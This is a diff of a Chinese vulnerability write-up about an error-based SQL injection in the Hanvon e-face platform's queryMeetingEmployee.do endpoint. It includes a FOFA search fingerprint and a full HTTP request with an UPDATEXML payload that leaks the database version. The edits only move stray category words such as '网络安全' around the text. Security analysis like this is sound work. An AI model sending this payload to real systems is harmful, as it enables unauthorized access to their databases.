@@ -17,6 +17,8 @@ V1.6.x
 # fofa语法
 
 > icon\_hash="1380907357"
+>
+> 软件
 
 # 漏洞分析
 
@@ -68,7 +70,7 @@ V1.6.x
 
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml
 
-软件
+计算机安全
 
 ```
 <!--查询参会人员列表-->
@@ -118,7 +120,7 @@ V1.6.x
 >
 > 需要 meetingId 参数存在
 >
-> 计算机安全
+> 网络安全
 
 ```
 GET /manage/mobiMeetingApp/queryMeetingEmployee.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
@@ -130,4 +132,4 @@ token: xxxxxx
 
 成功通过报错注入爆出数据库版本信息
 
-网络安全
+数据管理
